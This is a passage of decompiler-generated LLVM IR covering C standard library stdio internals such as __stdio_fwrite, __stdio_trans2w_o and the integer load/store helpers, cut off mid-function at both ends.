  uselistorder i32 %v1_8051d13, { 1, 0 }
  uselistorder i32 %v1_8051d10, { 1, 0 }
  uselistorder i32 %v1_8051d0f, { 0, 2, 1 }
  uselistorder i32 %v0_8051d05, { 1, 0 }
  uselistorder i32 %v2_8051ce9, { 1, 0 }
  uselistorder i32 %v2_8051ce7, { 1, 2, 0 }
  uselistorder i32 %v5_8051cdb, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8051d22, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051d1e, { 1, 0 }
  uselistorder label %dec_label_pc_8051d01, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051d30 = load i32, i32* @ebp, align 4
  %v0_8051d31 = load i32, i32* @edi, align 4
  %v0_8051d32 = load i32, i32* @esi, align 4
  %v0_8051d33 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d33, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8051d43 = add i32 %arg3, 1
  %v2_8051d43 = inttoptr i32 %v1_8051d43 to i8*
  %v3_8051d43 = load i8, i8* %v2_8051d43, align 1
  %v4_8051d43 = and i8 %v3_8051d43, 2
  %v5_8051d43 = icmp eq i8 %v4_8051d43, 0
  %v1_8051d47 = icmp eq i1 %v5_8051d43, false
  br i1 %v1_8051d47, label %dec_label_pc_8051dfe, label %dec_label_pc_8051d4d

dec_label_pc_8051d4d:                             ; preds = %entry
  %v1_8051d4d = add i32 %arg3, 4
  %v2_8051d4d = inttoptr i32 %v1_8051d4d to i32*
  %v3_8051d4d = load i32, i32* %v2_8051d4d, align 4
  %v13_8051d4d = icmp eq i32 %v3_8051d4d, -2
  %v1_8051d51 = add i32 %arg3, 16
  %v2_8051d51 = inttoptr i32 %v1_8051d51 to i32*
  %v3_8051d51 = load i32, i32* %v2_8051d51, align 4
  store i32 %v3_8051d51, i32* @edx, align 4
  %v1_8051d54 = add i32 %arg3, 12
  %v2_8051d54 = inttoptr i32 %v1_8051d54 to i32*
  %v3_8051d54 = load i32, i32* %v2_8051d54, align 4
  %v1_8051d57 = icmp eq i1 %v13_8051d4d, false
  %v2_8051d77 = sub i32 %v3_8051d54, %v3_8051d51
  store i32 %v2_8051d77, i32* %eax.global-to-local, align 4
  br i1 %v1_8051d57, label %dec_label_pc_8051d77, label %dec_label_pc_8051d59

dec_label_pc_8051d59:                             ; preds = %dec_label_pc_8051d4d
  %tmp22 = icmp ult i32 %v2_8051d77, %arg2
  br i1 %tmp22, label %dec_label_pc_8051d61, label %dec_label_pc_8051d63

dec_label_pc_8051d61:                             ; preds = %dec_label_pc_8051d59
  br label %dec_label_pc_8051d63

dec_label_pc_8051d63:                             ; preds = %dec_label_pc_8051d59, %dec_label_pc_8051d61
  %storemerge = phi i32 [ %v2_8051d77, %dec_label_pc_8051d61 ], [ %arg2, %dec_label_pc_8051d59 ]
  %v0_8051d64 = phi i32 [ %v2_8051d77, %dec_label_pc_8051d61 ], [ %arg2, %dec_label_pc_8051d59 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8051d67 = inttoptr i32 %v3_8051d51 to i16*
  %v4_8051d67 = call i32 @memcpy(i16* %v3_8051d67, i32 %v0_8051d64, i32 %v2_8051d77)
  store i32 %v4_8051d67, i32* %eax.global-to-local, align 4
  %v0_8051d6c = load i32, i32* @ebx, align 4
  %v1_8051d6c = add i32 %v0_8051d6c, 16
  %v2_8051d6c = inttoptr i32 %v1_8051d6c to i32*
  %v3_8051d6c = load i32, i32* %v2_8051d6c, align 4
  %v4_8051d6c = load i32, i32* @esi, align 4
  %v5_8051d6c = add i32 %v4_8051d6c, %v3_8051d6c
  store i32 %v5_8051d6c, i32* %v2_8051d6c, align 4
  br label %dec_label_pc_8051e16

dec_label_pc_8051d77:                             ; preds = %dec_label_pc_8051d4d
  %v6_8051d7b = icmp ult i32 %v2_8051d77, %arg2
  br i1 %v6_8051d7b, label %dec_label_pc_8051de5, label %dec_label_pc_8051d7d

dec_label_pc_8051d7d:                             ; preds = %dec_label_pc_8051d77
  %v0_8051d7d = load i32, i32* @ecx, align 4
  %v3_8051d81 = inttoptr i32 %v3_8051d51 to i16*
  %v4_8051d81 = call i32 @memcpy(i16* %v3_8051d81, i32 %arg2, i32 %v0_8051d7d)
  store i32 %v4_8051d81, i32* %eax.global-to-local, align 4
  %v0_8051d86 = load i32, i32* @ebx, align 4
  %v1_8051d86 = add i32 %v0_8051d86, 16
  %v2_8051d86 = inttoptr i32 %v1_8051d86 to i32*
  %v3_8051d86 = load i32, i32* %v2_8051d86, align 4
  %v4_8051d86 = load i32, i32* @edi, align 4
  %v5_8051d86 = add i32 %v4_8051d86, %v3_8051d86
  store i32 %v5_8051d86, i32* %v2_8051d86, align 4
  %v0_8051d8c = load i32, i32* @ebx, align 4
  %v1_8051d8c = add i32 %v0_8051d8c, 1
  %v2_8051d8c = inttoptr i32 %v1_8051d8c to i8*
  %v3_8051d8c = load i8, i8* %v2_8051d8c, align 1
  %v4_8051d8c = urem i8 %v3_8051d8c, 2
  %v5_8051d8c = icmp eq i8 %v4_8051d8c, 0
  br i1 %v5_8051d8c, label %dec_label_pc_8051e16, label %dec_label_pc_8051d96

dec_label_pc_8051d96:                             ; preds = %dec_label_pc_8051d7d
  %v0_8051d96 = load i32, i32* @edx, align 4
  %v0_8051d97 = load i32, i32* @edi, align 4
  %v4_8051d9b = call i32 @memrchr(i8 10, i32 %v0_8051d97, i32 %v0_8051d96)
  store i32 %v4_8051d9b, i32* %eax.global-to-local, align 4
  %v1_8051da3 = icmp eq i32 %v4_8051d9b, 0
  br i1 %v1_8051da3, label %dec_label_pc_8051e16, label %dec_label_pc_8051da7

dec_label_pc_8051da7:                             ; preds = %dec_label_pc_8051d96
  %v0_8051daa = load i32, i32* @ebx, align 4
  %v1_8051dab = call i32 @__stdio_wcommit(i32 %v0_8051daa)
  store i32 %v1_8051dab, i32* %eax.global-to-local, align 4
  %v1_8051db3 = icmp eq i32 %v1_8051dab, 0
  br i1 %v1_8051db3, label %dec_label_pc_8051e16, label %dec_label_pc_8051db7

dec_label_pc_8051db7:                             ; preds = %dec_label_pc_8051da7
  %v0_8051db7 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8051db7, %v1_8051dab
  br i1 %tmp23, label %dec_label_pc_8051dbd, label %dec_label_pc_8051dbf

dec_label_pc_8051dbd:                             ; preds = %dec_label_pc_8051db7
  br label %dec_label_pc_8051dbf

dec_label_pc_8051dbf:                             ; preds = %dec_label_pc_8051db7, %dec_label_pc_8051dbd
  %storemerge24 = phi i32 [ %v1_8051dab, %dec_label_pc_8051dbd ], [ %v0_8051db7, %dec_label_pc_8051db7 ]
  %v0_8051dc6 = phi i32 [ %v1_8051dab, %dec_label_pc_8051dbd ], [ %v0_8051db7, %dec_label_pc_8051db7 ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8051dc1 = sub i32 %v0_8051db7, %v0_8051dc6
  store i32 %v2_8051dc1, i32* %eax.global-to-local, align 4
  %v0_8051dc3 = load i32, i32* @ebp, align 4
  %v2_8051dc3 = add i32 %v0_8051dc3, %v2_8051dc1
  store i32 %v2_8051dc3, i32* %ebp.global-to-local, align 4
  %v4_8051dca = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_8051dc6, i32 %v2_8051dc1)
  store i32 %v4_8051dca, i32* %eax.global-to-local, align 4
  store i32 %v4_8051dca, i32* @edx, align 4
  %v1_8051dd4 = icmp eq i32 %v4_8051dca, 0
  br i1 %v1_8051dd4, label %dec_label_pc_8051e16, label %dec_label_pc_8051dd8

dec_label_pc_8051dd8:                             ; preds = %dec_label_pc_8051dbf
  %v0_8051dd8 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051dd8 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051dd8 = sub i32 %v0_8051dd8, %v4_8051dca
  %v2_8051ddc = add i32 %v2_8051dd8, %v1_8051dd8
  store i32 %v2_8051ddc, i32* %eax.global-to-local, align 4
  %v0_8051dde = load i32, i32* @ebx, align 4
  %v1_8051dde = add i32 %v0_8051dde, 16
  %v2_8051dde = inttoptr i32 %v1_8051dde to i32*
  %v3_8051dde = load i32, i32* %v2_8051dde, align 4
  %v5_8051dde = sub i32 %v3_8051dde, %v2_8051ddc
  store i32 %v5_8051dde, i32* %v2_8051dde, align 4
  %v0_8051de1 = load i32, i32* @edi, align 4
  %v1_8051de1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051de1 = sub i32 %v0_8051de1, %v1_8051de1
  store i32 %v2_8051de1, i32* @edi, align 4
  br label %dec_label_pc_8051e16

dec_label_pc_8051de5:                             ; preds = %dec_label_pc_8051d77
  %v2_8051de5 = add i32 %arg3, 8
  %v3_8051de5 = inttoptr i32 %v2_8051de5 to i32*
  %v4_8051de5 = load i32, i32* %v3_8051de5, align 4
  %v15_8051de5 = icmp eq i32 %v3_8051d51, %v4_8051de5
  br i1 %v15_8051de5, label %dec_label_pc_8051dfe, label %dec_label_pc_8051dea

dec_label_pc_8051dea:                             ; preds = %dec_label_pc_8051de5
  %v1_8051dee = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8051dee, i32* %eax.global-to-local, align 4
  %v1_8051df6 = icmp eq i32 %v1_8051dee, 0
  br i1 %v1_8051df6, label %dec_label_pc_8051dea.dec_label_pc_8051dfe_crit_edge, label %dec_label_pc_8051dfa

dec_label_pc_8051dea.dec_label_pc_8051dfe_crit_edge: ; preds = %dec_label_pc_8051dea
  %v0_8051dfe.pre = load i32, i32* @edi, align 4
  %v0_8051e06.pre = load i32, i32* @ebx, align 4
  %v2_8051e0d.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8051dfe

dec_label_pc_8051dfa:                             ; preds = %dec_label_pc_8051dea
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051e16

dec_label_pc_8051dfe:                             ; preds = %dec_label_pc_8051dea.dec_label_pc_8051dfe_crit_edge, %dec_label_pc_8051de5, %entry
  %v2_8051e0d = phi i32 [ %v2_8051e0d.pre, %dec_label_pc_8051dea.dec_label_pc_8051dfe_crit_edge ], [ %v0_8051d33, %dec_label_pc_8051de5 ], [ %v0_8051d33, %entry ]
  %v0_8051e06 = phi i32 [ %v0_8051e06.pre, %dec_label_pc_8051dea.dec_label_pc_8051dfe_crit_edge ], [ %arg3, %dec_label_pc_8051de5 ], [ %arg3, %entry ]
  %v0_8051dfe = phi i32 [ %v0_8051dfe.pre, %dec_label_pc_8051dea.dec_label_pc_8051dfe_crit_edge ], [ %arg2, %dec_label_pc_8051de5 ], [ %arg2, %entry ]
  store i32 %v2_8051e0d, i32* @ebx, align 4
  store i32 %v0_8051d31, i32* @edi, align 4
  %v4_8051e11 = inttoptr i32 %v0_8051e06 to i16*
  %v5_8051e11 = call i32 @__stdio_WRITE(i16* %v4_8051e11, i32 %v0_8051dfe, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051e11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051e16

dec_label_pc_8051e16:                             ; preds = %dec_label_pc_8051dbf, %dec_label_pc_8051da7, %dec_label_pc_8051d96, %dec_label_pc_8051d7d, %dec_label_pc_8051dfa, %dec_label_pc_8051dd8, %dec_label_pc_8051d63, %dec_label_pc_8051dfe
  %v0_8051e19 = load i32, i32* @edi, align 4
  store i32 %v0_8051e19, i32* %eax.global-to-local, align 4
  %v2_8051e1b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051e1b, i32* @ebx, align 4
  store i32 %v0_8051d32, i32* @esi, align 4
  store i32 %v0_8051d31, i32* @edi, align 4
  store i32 %v0_8051d30, i32* @ebp, align 4
  ret i32 %v0_8051e19

; uselistorder directives
  uselistorder i32 %v2_8051ddc, { 1, 0 }
  uselistorder i32 %v4_8051dca, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8051dc1, { 1, 0, 2 }
  uselistorder i32 %v0_8051db7, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8051d77, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_8051d31, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_8051e16, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8051dbf, { 1, 0 }
  uselistorder label %dec_label_pc_8051d63, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051e20 = load i32, i32* @ebx, align 4
  %v4_8051e24 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051e24, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8051e2c = bitcast i16* %arg1 to i32*
  %v2_8051e2c = load i32, i32* %v1_8051e2c, align 4
  store i32 %v2_8051e2c, i32* %eax.global-to-local, align 4
  %v1_8051e2e = urem i32 %v2_8051e2c, 65536
  store i32 %v1_8051e2e, i32* %edx.global-to-local, align 4
  %v2_8051e31 = and i32 %v1_8051e2e, %arg2
  %v3_8051e31 = icmp eq i32 %v2_8051e31, 0
  %v1_8051e33 = icmp eq i1 %v3_8051e31, false
  br i1 %v1_8051e33, label %dec_label_pc_8051e42, label %dec_label_pc_8051e35

dec_label_pc_8051e35:                             ; preds = %entry
  %v1_8051e35 = and i32 %v2_8051e2c, 2176
  %v2_8051e35 = icmp eq i32 %v1_8051e35, 0
  store i32 %v1_8051e35, i32* %edx.global-to-local, align 4
  %v1_8051e3b = icmp eq i1 %v2_8051e35, false
  br i1 %v1_8051e3b, label %dec_label_pc_8051e4a, label %dec_label_pc_8051e3d

dec_label_pc_8051e3d:                             ; preds = %dec_label_pc_8051e35
  %v2_8051e3d = or i32 %v2_8051e2c, %arg2
  store i32 %v2_8051e3d, i32* %eax.global-to-local, align 4
  %v1_8051e3f = trunc i32 %v2_8051e3d to i16
  store i16 %v1_8051e3f, i16* %arg1, align 2
  %v0_8051e42.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051e42

dec_label_pc_8051e42:                             ; preds = %entry, %dec_label_pc_8051e3d
  %v0_8051e87 = phi i32 [ %v4_8051e24, %entry ], [ %v0_8051e42.pre, %dec_label_pc_8051e3d ]
  %v1_8051e42 = inttoptr i32 %v0_8051e87 to i16*
  %v2_8051e42 = load i16, i16* %v1_8051e42, align 2
  %v3_8051e42 = zext i16 %v2_8051e42 to i32
  store i32 %v3_8051e42, i32* %edx.global-to-local, align 4
  %v2_8051e45 = and i16 %v2_8051e42, 32
  %v3_8051e45 = icmp eq i16 %v2_8051e45, 0
  br i1 %v3_8051e45, label %dec_label_pc_8051e5e, label %dec_label_pc_8051e4a

dec_label_pc_8051e4a:                             ; preds = %dec_label_pc_8051e42, %dec_label_pc_8051e35
  %v1_8051e4a = call i32 @__errno_location(i32 %v0_8051e20)
  store i32 %v1_8051e4a, i32* %eax.global-to-local, align 4
  %v1_8051e4f = inttoptr i32 %v1_8051e4a to i32*
  store i32 9, i32* %v1_8051e4f, align 4
  br label %dec_label_pc_8051e55

dec_label_pc_8051e55:                             ; preds = %dec_label_pc_8051e75, %dec_label_pc_8051e4a
  %v0_8051e55 = load i32, i32* @ebx, align 4
  %v1_8051e55 = inttoptr i32 %v0_8051e55 to i16*
  %v2_8051e55 = load i16, i16* %v1_8051e55, align 2
  %v3_8051e55 = or i16 %v2_8051e55, 8
  store i16 %v3_8051e55, i16* %v1_8051e55, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051eb8

dec_label_pc_8051e5e:                             ; preds = %dec_label_pc_8051e42
  %v2_8051e5e = urem i16 %v2_8051e42, 4
  %v3_8051e5e = icmp eq i16 %v2_8051e5e, 0
  br i1 %v3_8051e5e, label %dec_label_pc_8051ea4, label %dec_label_pc_8051e63

dec_label_pc_8051e63:                             ; preds = %dec_label_pc_8051e5e
  %v2_8051e63 = and i32 %v3_8051e42, 4
  %v3_8051e63 = icmp eq i32 %v2_8051e63, 0
  %v1_8051e66 = icmp eq i1 %v3_8051e63, false
  br i1 %v1_8051e66, label %dec_label_pc_8051e94, label %dec_label_pc_8051e68

dec_label_pc_8051e68:                             ; preds = %dec_label_pc_8051e63
  %v1_8051e68 = add i32 %v0_8051e87, 20
  %v2_8051e68 = inttoptr i32 %v1_8051e68 to i32*
  %v3_8051e68 = load i32, i32* %v2_8051e68, align 4
  store i32 %v3_8051e68, i32* %eax.global-to-local, align 4
  %v2_8051e6b = add i32 %v0_8051e87, 16
  %v3_8051e6b = inttoptr i32 %v2_8051e6b to i32*
  %v4_8051e6b = load i32, i32* %v3_8051e6b, align 4
  %v15_8051e6b = icmp eq i32 %v3_8051e68, %v4_8051e6b
  %v1_8051e6e = icmp eq i1 %v15_8051e6b, false
  br i1 %v1_8051e6e, label %dec_label_pc_8051e75, label %dec_label_pc_8051e70

dec_label_pc_8051e70:                             ; preds = %dec_label_pc_8051e68
  %v2_8051e70 = and i32 %v3_8051e42, 2
  %v3_8051e70 = icmp eq i32 %v2_8051e70, 0
  br i1 %v3_8051e70, label %dec_label_pc_8051e94, label %dec_label_pc_8051e75

dec_label_pc_8051e75:                             ; preds = %dec_label_pc_8051e70, %dec_label_pc_8051e68
  %v1_8051e75 = and i32 %v3_8051e42, 1024
  store i32 %v1_8051e75, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_8051e75, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_8051e88 = call i32 @__GI_fseek(i32 %v0_8051e87, i32 0, i32 %tmp17, i32 %v1_8051e75)
  store i32 %v5_8051e88, i32* %eax.global-to-local, align 4
  %v1_8051e90 = icmp eq i32 %v5_8051e88, 0
  %v1_8051e92 = icmp eq i1 %v1_8051e90, false
  br i1 %v1_8051e92, label %dec_label_pc_8051e55, label %dec_label_pc_8051e75.dec_label_pc_8051e94_crit_edge

dec_label_pc_8051e75.dec_label_pc_8051e94_crit_edge: ; preds = %dec_label_pc_8051e75
  %v0_8051e94.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051e94

dec_label_pc_8051e94:                             ; preds = %dec_label_pc_8051e75.dec_label_pc_8051e94_crit_edge, %dec_label_pc_8051e70, %dec_label_pc_8051e63
  %v10_8051e94 = phi i32 [ %v0_8051e94.pre, %dec_label_pc_8051e75.dec_label_pc_8051e94_crit_edge ], [ %v0_8051e87, %dec_label_pc_8051e70 ], [ %v0_8051e87, %dec_label_pc_8051e63 ]
  %v1_8051e94 = inttoptr i32 %v10_8051e94 to i16*
  %v2_8051e94 = load i16, i16* %v1_8051e94, align 2
  %v3_8051e94 = and i16 %v2_8051e94, -4
  store i16 %v3_8051e94, i16* %v1_8051e94, align 2
  %v0_8051e98 = load i32, i32* @ebx, align 4
  %v1_8051e98 = add i32 %v0_8051e98, 8
  %v2_8051e98 = inttoptr i32 %v1_8051e98 to i32*
  %v3_8051e98 = load i32, i32* %v2_8051e98, align 4
  store i32 %v3_8051e98, i32* %eax.global-to-local, align 4
  %v2_8051e9b = add i32 %v0_8051e98, 24
  %v3_8051e9b = inttoptr i32 %v2_8051e9b to i32*
  store i32 %v3_8051e98, i32* %v3_8051e9b, align 4
  %v0_8051e9e = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e9e = load i32, i32* @ebx, align 4
  %v2_8051e9e = add i32 %v1_8051e9e, 16
  %v3_8051e9e = inttoptr i32 %v2_8051e9e to i32*
  store i32 %v0_8051e9e, i32* %v3_8051e9e, align 4
  %v0_8051ea1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ea1 = load i32, i32* @ebx, align 4
  %v2_8051ea1 = add i32 %v1_8051ea1, 20
  %v3_8051ea1 = inttoptr i32 %v2_8051ea1 to i32*
  store i32 %v0_8051ea1, i32* %v3_8051ea1, align 4
  %v0_8051ea4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051ea4

dec_label_pc_8051ea4:                             ; preds = %dec_label_pc_8051e5e, %dec_label_pc_8051e94
  %v9_8051ea4 = phi i32 [ %v0_8051e87, %dec_label_pc_8051e5e ], [ %v0_8051ea4.pre, %dec_label_pc_8051e94 ]
  %v1_8051ea4 = inttoptr i32 %v9_8051ea4 to i16*
  %v2_8051ea4 = load i16, i16* %v1_8051ea4, align 2
  %v3_8051ea4 = or i16 %v2_8051ea4, 64
  store i16 %v3_8051ea4, i16* %v1_8051ea4, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051eaa = load i32, i32* @ebx, align 4
  %v1_8051eaa = inttoptr i32 %v0_8051eaa to i16*
  %v2_8051eaa = load i16, i16* %v1_8051eaa, align 2
  %v3_8051eaa = zext i16 %v2_8051eaa to i32
  store i32 %v3_8051eaa, i32* %eax.global-to-local, align 4
  %v3_8051ead = and i16 %v2_8051eaa, 2816
  %v4_8051ead = icmp eq i16 %v3_8051ead, 0
  %v1_8051eb0 = icmp eq i1 %v4_8051ead, false
  br i1 %v1_8051eb0, label %dec_label_pc_8051eb8, label %dec_label_pc_8051eb2

dec_label_pc_8051eb2:                             ; preds = %dec_label_pc_8051ea4
  %v1_8051eb2 = add i32 %v0_8051eaa, 12
  %v2_8051eb2 = inttoptr i32 %v1_8051eb2 to i32*
  %v3_8051eb2 = load i32, i32* %v2_8051eb2, align 4
  store i32 %v3_8051eb2, i32* %eax.global-to-local, align 4
  %v2_8051eb5 = add i32 %v0_8051eaa, 28
  %v3_8051eb5 = inttoptr i32 %v2_8051eb5 to i32*
  store i32 %v3_8051eb2, i32* %v3_8051eb5, align 4
  %v0_8051eb8.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051eb8

dec_label_pc_8051eb8:                             ; preds = %dec_label_pc_8051ea4, %dec_label_pc_8051e55, %dec_label_pc_8051eb2
  %v0_8051eb8 = phi i32 [ 0, %dec_label_pc_8051ea4 ], [ -1, %dec_label_pc_8051e55 ], [ %v0_8051eb8.pre, %dec_label_pc_8051eb2 ]
  store i32 %v0_8051eb8, i32* %eax.global-to-local, align 4
  %v2_8051eba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051eba, i32* %edx.global-to-local, align 4
  store i32 %v0_8051e20, i32* @ebx, align 4
  ret i32 %v0_8051eb8

; uselistorder directives
  uselistorder i32 %v0_8051eb8, { 1, 0 }
  uselistorder i32 %v0_8051eaa, { 1, 0, 2 }
  uselistorder i32 %tmp17, { 1, 0 }
  uselistorder i32 %v1_8051e75, { 1, 0, 2 }
  uselistorder i32 %v0_8051e87, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8051e2e, { 1, 0 }
  uselistorder i32 %v2_8051e2c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8051e20, { 1, 0 }
  uselistorder i32 1024, { 0, 17, 3, 10, 8, 18, 4, 1, 2, 15, 5, 14, 6, 16, 9, 11, 12, 13, 7 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051eb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ea4, { 1, 0 }
  uselistorder label %dec_label_pc_8051e42, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8051ec8 = icmp slt i32 %tmp, 0
  %v3_8051ef1 = and i32 %tmp5, 2048
  %v4_8051ef1 = icmp eq i32 %v3_8051ef1, 0
  br i1 %v5_8051ec8, label %dec_label_pc_8051ef1, label %dec_label_pc_8051ecf

dec_label_pc_8051ecf:                             ; preds = %entry
  %v1_8051ed2 = icmp eq i1 %v4_8051ef1, false
  br i1 %v1_8051ed2, label %dec_label_pc_8051ef6, label %dec_label_pc_8051ed4

dec_label_pc_8051ed4:                             ; preds = %dec_label_pc_8051ecf
  %v1_8051ed4 = inttoptr i32 %tmp4 to i32*
  %v2_8051ed4 = load i32, i32* %v1_8051ed4, align 4
  %v6_8051ed6 = icmp eq i32 %tmp5, 256
  %v1_8051edc = icmp eq i1 %v6_8051ed6, false
  br i1 %v1_8051edc, label %dec_label_pc_8051ee3, label %dec_label_pc_8051ede

dec_label_pc_8051ede:                             ; preds = %dec_label_pc_8051ed4
  %v1_8051ede = urem i32 %v2_8051ed4, 256
  br label %dec_label_pc_8051eee

dec_label_pc_8051ee3:                             ; preds = %dec_label_pc_8051ed4
  %v6_8051ee3 = icmp eq i32 %tmp5, 512
  %v1_8051ee9 = icmp eq i1 %v6_8051ee3, false
  br i1 %v1_8051ee9, label %dec_label_pc_8051eee, label %dec_label_pc_8051eeb

dec_label_pc_8051eeb:                             ; preds = %dec_label_pc_8051ee3
  %v1_8051eeb = urem i32 %v2_8051ed4, 65536
  br label %dec_label_pc_8051eee

dec_label_pc_8051eee:                             ; preds = %dec_label_pc_8051ee3, %dec_label_pc_8051ede, %dec_label_pc_8051eeb
  %v0_8051ef0 = phi i32 [ %v2_8051ed4, %dec_label_pc_8051ee3 ], [ %v1_8051ede, %dec_label_pc_8051ede ], [ %v1_8051eeb, %dec_label_pc_8051eeb ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8051ef0

dec_label_pc_8051ef1:                             ; preds = %entry
  br i1 %v4_8051ef1, label %dec_label_pc_8051efc, label %dec_label_pc_8051ef6

dec_label_pc_8051ef6:                             ; preds = %dec_label_pc_8051ef1, %dec_label_pc_8051ecf
  %v1_8051ef6 = add i32 %tmp4, 4
  %v2_8051ef6 = inttoptr i32 %v1_8051ef6 to i32*
  %v3_8051ef6 = load i32, i32* %v2_8051ef6, align 4
  store i32 %v3_8051ef6, i32* @edx, align 4
  %v1_8051ef9 = inttoptr i32 %tmp4 to i32*
  %v2_8051ef9 = load i32, i32* %v1_8051ef9, align 4
  ret i32 %v2_8051ef9

dec_label_pc_8051efc:                             ; preds = %dec_label_pc_8051ef1
  %v1_8051efc = inttoptr i32 %tmp4 to i32*
  %v2_8051efc = load i32, i32* %v1_8051efc, align 4
  %v6_8051efe = icmp eq i32 %tmp5, 256
  %v1_8051f04 = icmp eq i1 %v6_8051efe, false
  br i1 %v1_8051f04, label %dec_label_pc_8051f0b, label %dec_label_pc_8051f06

dec_label_pc_8051f06:                             ; preds = %dec_label_pc_8051efc
  %v1_8051f06 = mul i32 %v2_8051efc, 16777216
  %v2_8051f06 = sdiv i32 %v1_8051f06, 16777216
  br label %dec_label_pc_8051f14

dec_label_pc_8051f0b:                             ; preds = %dec_label_pc_8051efc
  %v6_8051f0b = icmp eq i32 %tmp5, 512
  %v1_8051f11 = icmp eq i1 %v6_8051f0b, false
  br i1 %v1_8051f11, label %dec_label_pc_8051f14, label %dec_label_pc_8051f13

dec_label_pc_8051f13:                             ; preds = %dec_label_pc_8051f0b
  %v1_8051f13 = mul i32 %v2_8051efc, 65536
  %v2_8051f13 = sdiv i32 %v1_8051f13, 65536
  br label %dec_label_pc_8051f14

dec_label_pc_8051f14:                             ; preds = %dec_label_pc_8051f0b, %dec_label_pc_8051f06, %dec_label_pc_8051f13
  %v0_8051f14 = phi i32 [ %v2_8051efc, %dec_label_pc_8051f0b ], [ %v2_8051f06, %dec_label_pc_8051f06 ], [ %v2_8051f13, %dec_label_pc_8051f13 ]
  %v1_8051f14 = ashr i32 %v0_8051f14, 31
  store i32 %v1_8051f14, i32* @edx, align 4
  ret i32 %v0_8051f14

; uselistorder directives
  uselistorder i32 %v0_8051f14, { 1, 0 }
  uselistorder i32 %v2_8051efc, { 2, 0, 1 }
  uselistorder i32 %v2_8051ed4, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8051f14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051eee, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f18 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f18, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8051f1d = ptrtoint i16* %tmp5 to i32
